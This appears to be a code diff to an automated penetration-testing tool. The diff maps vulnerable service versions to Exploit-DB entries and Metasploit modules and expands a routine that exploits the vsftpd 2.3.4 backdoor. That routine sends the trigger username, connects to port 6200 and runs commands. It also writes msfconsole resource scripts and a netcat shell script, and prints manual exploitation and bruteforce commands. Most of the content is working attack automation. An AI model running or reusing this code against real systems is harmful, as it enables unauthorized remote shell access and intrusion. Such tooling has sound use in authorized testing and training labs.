@@ -1795,68 +1795,167 @@ class Enumeration:
                 "title": "vsftpd 2.3.4 - Backdoor Command Execution",
                 "path": "unix/remote/49757.py",
                 "type": "remote",
-                "platform": "unix"
+                "platform": "unix",
+                "metasploit_module": "exploit/unix/ftp/vsftpd_234_backdoor"
             }]
+        
+        # Handle common known vulnerabilities with direct mappings
+        known_vulnerabilities = {
+            "apache": {
+                "2.2.8": [{
+                    "title": "Apache 2.2.8 - WebDAV / PHP Remote Code Execution",
+                    "path": "unix/remote/18721.py",
+                    "type": "remote",
+                    "platform": "unix"
+                }]
+            },
+            "distccd": {
+                "v1": [{
+                    "title": "DistCC Daemon - Command Execution",
+                    "path": "unix/remote/9915.rb",
+                    "type": "remote",
+                    "platform": "unix",
+                    "metasploit_module": "exploit/unix/misc/distcc_exec" 
+                }]
+            },
+            "samba": {
+                "3.0.20": [{
+                    "title": "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution",
+                    "path": "unix/remote/16320.rb",
+                    "type": "remote",
+                    "platform": "unix",
+                    "metasploit_module": "exploit/multi/samba/usermap_script"
+                }]
+            }
+        }
+        
+        # Check if we have hardcoded exploit for this service/version
+        if service_name.lower() in known_vulnerabilities and version:
+            for known_version, exploits in known_vulnerabilities[service_name.lower()].items():
+                if version.startswith(known_version):
+                    self.logger.info(f"Found known vulnerability for {service_name} {version}")
+                    return exploits
         
         # Construct search query
         search_query = service_name
         if version:
             search_query = f"{service_name} {version}"
         
-        # Run searchsploit
-        try:
-            cmd = ["searchsploit", search_query]
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            output = result.stdout
-            
-            # Save raw output to file with timestamp
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            output_file = f"searchsploit_{service_name.replace(' ', '_')}_{timestamp}.txt"
-            
-            try:
-                with open(output_file, 'w') as f:
-                    f.write(output)
-            except Exception as e:
-                self.logger.warning(f"Could not save searchsploit output: {str(e)}")
-            
-            # Parse the output
-            vulnerabilities = []
-            lines = output.split('\n')
-            
-            for line in lines:
-                if line and not line.startswith('Exploits:') and not line.startswith('Shellcodes:') and not line.startswith('Papers:'):
-                    # Extract exploit details
-                    parts = line.strip().split('  ')
-                    parts = [p for p in parts if p.strip()]
-                    
-                    if len(parts) >= 2:
-                        title = parts[0].strip()
-                        path = parts[-1].strip()
-                        
-                        if title and path:
-                            vulnerabilities.append({
-                                "title": title,
-                                "path": path,
-                                "type": "unknown",
-                                "platform": "unknown"
-                            })
-            
-            if vulnerabilities:
-                return vulnerabilities
-                
-            # If no results found, try alternative search
-            if not vulnerabilities and version:
-                self.logger.info(f"No results found, trying broader search for {service_name}")
-                return self.find_vulnerabilities_with_searchsploit(service_name)
-                
-            return vulnerabilities
+        # List of search queries to try in order if first one fails
+        search_variations = [
+            search_query,
+            service_name.lower(),  # Try lowercase service name
+            re.sub(r'[^a-zA-Z0-9]', '', service_name)  # Try without special chars
+        ]
         
-        except subprocess.CalledProcessError as e:
-            self.logger.error(f"Error running searchsploit: {str(e)}")
-            return []
-        except Exception as e:
-            self.logger.error(f"Unexpected error in vulnerability search: {str(e)}")
-            return []
+        # If we have a version, add variations with just the major.minor parts
+        if version and '.' in version:
+            version_parts = version.split('.')
+            if len(version_parts) >= 2:
+                major_minor = '.'.join(version_parts[:2])
+                search_variations.append(f"{service_name} {major_minor}")
+        
+        # Try each search variation
+        vulnerabilities = []
+        tried_queries = set()
+        
+        for query in search_variations:
+            if query in tried_queries:
+                continue
+                
+            tried_queries.add(query)
+            self.logger.info(f"Trying searchsploit query: {query}")
+            
+            # Run searchsploit
+            try:
+                cmd = ["searchsploit", "--json", query]
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                
+                if result.returncode != 0:
+                    self.logger.warning(f"Searchsploit returned non-zero exit code: {result.returncode}")
+                    self.logger.warning(f"Error output: {result.stderr}")
+                    continue
+                
+                output = result.stdout
+                
+                # Try to parse JSON output
+                try:
+                    search_results = json.loads(output)
+                    if "RESULTS_EXPLOIT" in search_results:
+                        exploits = search_results["RESULTS_EXPLOIT"]
+                        for exploit in exploits:
+                            vulnerabilities.append({
+                                "title": exploit.get("Title", "Unknown"),
+                                "path": exploit.get("Path", "Unknown"),
+                                "type": "remote" if "remote" in exploit.get("Path", "").lower() else "local",
+                                "platform": exploit.get("Platform", "unknown")
+                            })
+                except json.JSONDecodeError:
+                    self.logger.warning("Failed to parse JSON output from searchsploit")
+                    # Fall back to text parsing
+                    lines = output.split('\n')
+                    for line in lines:
+                        if line and not line.startswith('Exploits:') and not line.startswith('Shellcodes:') and not line.startswith('Papers:'):
+                            # Extract exploit details
+                            parts = line.strip().split('  ')
+                            parts = [p for p in parts if p.strip()]
+                            
+                            if len(parts) >= 2:
+                                title = parts[0].strip()
+                                path = parts[-1].strip()
+                                
+                                if title and path:
+                                    vulnerabilities.append({
+                                        "title": title,
+                                        "path": path,
+                                        "type": "remote" if "remote" in path.lower() else "local",
+                                        "platform": "unknown"
+                                    })
+                
+                # If we found vulnerabilities, no need to try other variations
+                if vulnerabilities:
+                    break
+            
+            except subprocess.CalledProcessError as e:
+                self.logger.error(f"Error running searchsploit: {str(e)}")
+                continue
+            except Exception as e:
+                self.logger.error(f"Unexpected error in vulnerability search: {str(e)}")
+                continue
+        
+        # If no results found from searchsploit, try to guess based on service
+        if not vulnerabilities:
+            self.logger.warning(f"No vulnerabilities found via searchsploit for {service_name} {version if version else ''}")
+            
+            # Add some common/generic exploits for well-known services
+            if service_name.lower() == "ftp":
+                vulnerabilities.append({
+                    "title": "Generic FTP Bruteforce",
+                    "path": "generic/bruteforce/ftp_login",
+                    "type": "remote",
+                    "platform": "multiple",
+                    "metasploit_module": "auxiliary/scanner/ftp/ftp_login"
+                })
+            
+            elif service_name.lower() in ["http", "www", "httpd"]:
+                vulnerabilities.append({
+                    "title": "Generic HTTP Directory Scanner",
+                    "path": "generic/scanner/http_dir",
+                    "type": "remote",
+                    "platform": "multiple",
+                    "metasploit_module": "auxiliary/scanner/http/dir_scanner"
+                })
+            
+            elif service_name.lower() == "ssh":
+                vulnerabilities.append({
+                    "title": "Generic SSH Bruteforce",
+                    "path": "generic/bruteforce/ssh_login", 
+                    "type": "remote",
+                    "platform": "multiple",
+                    "metasploit_module": "auxiliary/scanner/ssh/ssh_login"
+                })
+        
+        return vulnerabilities
 
     def prepare_exploit(self, exploit_path, target):
         """
@@ -1946,27 +2045,40 @@ class Enumeration:
             # Close socket - the exploit should have triggered a backdoor on port 6200
             sock.close()
             
-            # Wait briefly for backdoor to open
+            # Wait for backdoor to open - slightly longer wait
             self.console.print("[cyan]Waiting for backdoor to open on port 6200...[/cyan]")
-            time.sleep(3)
+            time.sleep(5)  # Increased wait time
             
             # Try to connect to the backdoor shell
             try:
                 self.console.print("[cyan]Attempting to connect to backdoor shell...[/cyan]")
-                tn = telnetlib.Telnet(target, 6200, timeout=10)
-                self.console.print("[bold green]Successfully connected to backdoor shell![/bold green]")
                 
-                # Send a test command
-                tn.write(b"id\n")
-                output = tn.read_until(b"$", timeout=5).decode('utf-8', errors='ignore')
-                self.console.print(f"[green]Command output: {output}[/green]")
+                # Try to establish connection to check if port is open
+                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                test_sock.settimeout(10)
                 
-                # Leave the shell open for the user to interact with
-                self.console.print("[bold green]The backdoor shell is now accessible at {target}:6200[/bold green]")
-                self.console.print("[yellow]Note: Shell session is waiting. Use nc or telnet to connect manually:[/yellow]")
-                self.console.print(f"[white]telnet {target} 6200[/white]")
-                return True
-            
+                if test_sock.connect_ex((target, 6200)) == 0:
+                    test_sock.close()
+                    self.console.print("[green]Port 6200 is open! Connecting to backdoor...[/green]")
+                    
+                    # Use telnet to connect to backdoor
+                    tn = telnetlib.Telnet(target, 6200, timeout=10)
+                    self.console.print("[bold green]Successfully connected to backdoor shell![/bold green]")
+                    
+                    # Send a test command
+                    tn.write(b"id\n")
+                    output = tn.read_until(b"$", timeout=5).decode('utf-8', errors='ignore')
+                    self.console.print(f"[green]Command output: {output}[/green]")
+                    
+                    # Provide instructions for manual connection
+                    self.console.print(f"[bold green]Backdoor shell is now accessible at {target}:6200[/bold green]")
+                    self.console.print("[yellow]Connect manually with:[/yellow]")
+                    self.console.print(f"[white]telnet {target} 6200[/white]")
+                    self.console.print(f"[white]nc {target} 6200[/white]")
+                    
+                    return True
+                else:
+                    self.console.print("[yellow]Port 6200 is not open. First attempt failed.[/yellow]")
             except Exception as e:
                 self.logger.warning(f"First attempt failed to connect to backdoor: {e}")
                 self.console.print(f"[yellow]First attempt failed to connect to backdoor: {e}[/yellow]")
@@ -1975,64 +2087,126 @@ class Enumeration:
             self.logger.warning(f"Error triggering vsftpd backdoor (first attempt): {e}")
             self.console.print(f"[yellow]Error triggering vsftpd backdoor (first attempt): {e}[/yellow]")
         
-        # Second attempt with different approach
-        self.console.print("\n[yellow]First attempt failed. Trying second approach...[/yellow]")
+        # Second attempt with different approach - using metasploit directly
+        self.console.print("\n[yellow]First attempt failed. Trying second approach with Metasploit...[/yellow]")
         
         try:
-            # Try using netcat for a more direct approach
             import subprocess
-            
-            # Create a temporary script to automate the process
             import os
-            script_path = os.path.join(self.config.output_dir, "vsftpd_exploit.sh")
+            import tempfile
             
-            with open(script_path, "w") as f:
-                f.write(f"""#!/bin/bash
-# Exploit script for vsftpd 2.3.4 backdoor
-echo "Attempting to trigger vsftpd 2.3.4 backdoor on {target}..."
-# Send the backdoor trigger sequence
-(echo "USER backdoored:)"; sleep 1; echo "PASS any"; sleep 5) | nc {target} 21
-# Try to connect to the backdoor
-echo "Attempting to connect to backdoor on port 6200..."
-nc {target} 6200
+            # Create a temporary resource script for metasploit
+            fd, resource_path = tempfile.mkstemp(suffix='.rc', prefix='vsftpd_')
+            os.close(fd)
+            
+            with open(resource_path, 'w') as f:
+                f.write(f"""use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS {target}
+set RPORT 21
+exploit -z
 """)
             
-            # Make the script executable
-            os.chmod(script_path, 0o755)
+            self.console.print("[cyan]Running Metasploit with vsftpd_234_backdoor module...[/cyan]")
+            self.console.print(f"[cyan]Using resource script: {resource_path}[/cyan]")
             
-            # Run the script
-            self.console.print(f"[cyan]Running custom exploit script: {script_path}[/cyan]")
-            self.console.print("[yellow]Note: This will open an interactive shell if successful.[/yellow]")
-            self.console.print("[yellow]Press Ctrl+C to exit if no connection is established after a few seconds.[/yellow]")
-            
-            # Execute the script - this will give control to the user if successful
-            subprocess.run(["/bin/bash", script_path])
-            
-            # If we get here, the script completed - ask user if it worked
-            self.console.print("\n[yellow]Did the exploit successfully give you shell access? (y/n)[/yellow]")
-            response = input("> ").strip().lower()
-            
-            if response.startswith("y"):
-                self.logger.info("User confirmed successful vsftpd exploit")
-                self.console.print("[bold green]Exploitation successful![/bold green]")
-                return True
-            else:
-                self.logger.warning("User reported vsftpd exploit was not successful")
-                self.console.print("[yellow]Exploitation was not successful.[/yellow]")
+            # Run metasploit with the resource script
+            try:
+                process = subprocess.Popen(
+                    ["msfconsole", "-q", "-r", resource_path],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    text=True
+                )
                 
-                # Provide alternative method
-                self.console.print("\n[bold cyan]Alternative method to try manually:[/bold cyan]")
-                self.console.print("1. In one terminal, run:")
-                self.console.print(f"[white]nc -nvlp 4444[/white]")
-                self.console.print("2. In another terminal, run:")
-                self.console.print(f"[white]msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; set PAYLOAD cmd/unix/interact; run\"[/white]")
+                # Poll for output
+                while True:
+                    output = process.stdout.readline()
+                    if not output and process.poll() is not None:
+                        break
+                    if output:
+                        self.console.print(output.strip())
+                        
+                        # Check for success indicators in the output
+                        if "Command shell session" in output or "Meterpreter session" in output:
+                            self.console.print("[bold green]Metasploit reports successful exploitation![/bold green]")
+                            return True
                 
-                return False
+                # If we get here without a success indicator, provide fallback options
+                self.console.print("\n[yellow]Metasploit automation completed but success couldn't be confirmed.[/yellow]")
+                self.console.print("\n[bold cyan]Alternative methods to try manually:[/bold cyan]")
+                self.console.print("1. Run metasploit directly:")
+                self.console.print(f"[white]msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit\"[/white]")
+                
+                self.console.print("\n2. Try a manual netcat approach:")
+                self.console.print(f"[white]# In one terminal:[/white]")
+                self.console.print(f"[white]echo -e \"USER backdoored:)\\nPASS x\" | nc {target} 21[/white]")
+                self.console.print(f"[white]# In another terminal (wait 5 seconds after running the above):[/white]")
+                self.console.print(f"[white]nc {target} 6200[/white]")
+                
+                # Ask user if they want to try manual method
+                self.console.print("\n[yellow]Would you like to try the manual netcat method now? (y/n)[/yellow]")
+                response = input("> ").strip().lower()
+                
+                if response.startswith("y"):
+                    # Run the manual netcat approach
+                    self.console.print("\n[cyan]Running manual netcat exploit...[/cyan]")
+                    
+                    # Create a temporary script
+                    script_path = os.path.join(self.config.output_dir, "vsftpd_manual.sh")
+                    with open(script_path, "w") as f:
+                        f.write(f"""#!/bin/bash
+echo "Sending trigger to vsftpd 2.3.4 on {target}:21..."
+echo -e "USER backdoored:)\\nPASS x" | nc {target} 21
+echo "Waiting 5 seconds for backdoor..."
+sleep 5
+echo "Connecting to backdoor on {target}:6200..."
+nc -v {target} 6200
+""")
+                    
+                    # Make executable
+                    os.chmod(script_path, 0o755)
+                    
+                    # Run the script
+                    self.console.print(f"[cyan]Executing: {script_path}[/cyan]")
+                    subprocess.run(["/bin/bash", script_path])
+                    
+                    # Ask if it worked
+                    self.console.print("\n[yellow]Did the exploit successfully give you shell access? (y/n)[/yellow]")
+                    result = input("> ").strip().lower()
+                    
+                    if result.startswith("y"):
+                        self.logger.info("User confirmed successful vsftpd exploit")
+                        self.console.print("[bold green]Exploitation successful![/bold green]")
+                        return True
+                
+            except Exception as msf_error:
+                self.logger.error(f"Error running Metasploit: {msf_error}")
+                self.console.print(f"[bold red]Error running Metasploit: {msf_error}[/bold red]")
+            
+            finally:
+                # Clean up temporary file
+                try:
+                    os.unlink(resource_path)
+                except:
+                    pass
         
         except Exception as e:
             self.logger.error(f"Error during second vsftpd exploit attempt: {e}")
             self.console.print(f"[bold red]Error during second vsftpd exploit attempt: {e}[/bold red]")
-            return False
+        
+        # If we get here, all attempts failed
+        self.console.print("\n[yellow]All automatic attempts failed.[/yellow]")
+        self.console.print("[yellow]This may be because:[/yellow]")
+        self.console.print("1. [yellow]The target is not actually running vulnerable vsftpd 2.3.4[/yellow]")
+        self.console.print("2. [yellow]The backdoor is not triggerable from your current position[/yellow]")
+        self.console.print("3. [yellow]A firewall is blocking the backdoor port (6200)[/yellow]")
+        
+        self.console.print("\n[bold cyan]You can try the following manually:[/bold cyan]")
+        self.console.print(f"1. [white]nc -v {target} 21[/white] (check if FTP is accessible)")
+        self.console.print(f"2. [white]telnet {target} 21[/white] (try to trigger manually with 'USER backdoored:)')")
+        self.console.print(f"3. [white]nmap -p 6200 {target}[/white] (check if backdoor port is open)")
+        
+        return False
 
     def _is_binary(self, content):
         """
